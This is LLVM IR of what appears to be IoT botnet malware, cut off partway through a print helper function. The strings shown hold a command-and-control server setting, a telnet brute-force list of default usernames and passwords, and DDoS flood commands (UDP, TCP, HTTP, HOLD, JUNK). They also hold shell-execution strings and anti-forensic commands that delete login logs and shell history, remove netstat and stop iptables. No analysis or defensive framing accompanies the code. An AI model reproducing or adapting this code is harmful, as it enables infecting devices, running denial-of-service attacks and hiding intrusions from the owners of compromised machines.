; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@.str = private unnamed_addr constant [14 x i8] c"PAYLOADZZZZ\0D\0A\00", align 1
@infectline = dso_local global i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [6 x i8] c"IP:23\00", align 1
@commServer = dso_local global [1 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@useragents = dso_local global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@mainCommSock = dso_local global i32 0, align 4
@currentServer = dso_local global i32 -1, align 4
@gotIP = dso_local global i32 0, align 4
@numpids = dso_local global i64 0, align 8
@macAddress = dso_local global [6 x i8] zeroinitializer, align 1
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.27 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.30 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@usernames = dso_local global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)], align 16
@.str.31 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.32 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@passwords = dso_local global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)], align 16
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.39 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.40 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.43 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.45 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@pids = dso_local global i32* null, align 8
@.str.46 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.47 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@ourIP = dso_local global %struct.in_addr zeroinitializer, align 4
@.str.48 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"sername:\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.55 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.56 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.57 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.59 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.61 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.63 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.66 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.68 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.69 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.71 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.72 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@scanPid = dso_local global i32 0, align 4
@.str.73 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.74 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.75 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.77 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.79 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.80 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.82 = private unnamed_addr constant [6 x i8] c"COMBO\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.85 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.86 = private unnamed_addr constant [8 x i8] c"FATCOCK\00", align 1
@.str.87 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.88 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.90 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.91 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.92 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.93 = private unnamed_addr constant [16 x i8] c"killall -9 perl\00", align 1
@.str.94 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.95 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.96 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.97 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.98 = private unnamed_addr constant [6 x i8] c"DONGS\00", align 1
@.str.99 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.100 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.101 = private unnamed_addr constant [5 x i8] c"sshd\00", align 1
@.str.102 = private unnamed_addr constant [19 x i8] c"/usr/sbin/dropbear\00", align 1
@.str.103 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.105 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.108 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.110 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.111 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.112 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @init_rand(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

10:                                               ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

13:                                               ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

31:                                               ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10, !llvm.loop !6

34:                                               ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

34:                                               ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @trim(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* noundef %6) #11
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 noundef %16) #11
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 noundef %33) #11
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8* noundef) #1

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @zprintf(i8* noundef %0, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %8 = call i32 @print(i8** noundef null, i8* noundef %6, %struct.__va_list_tag* noundef %7)
  ret i32 %8
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @print(i8** noundef %0, i8* noundef %1, %struct.__va_list_tag* noundef %2) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

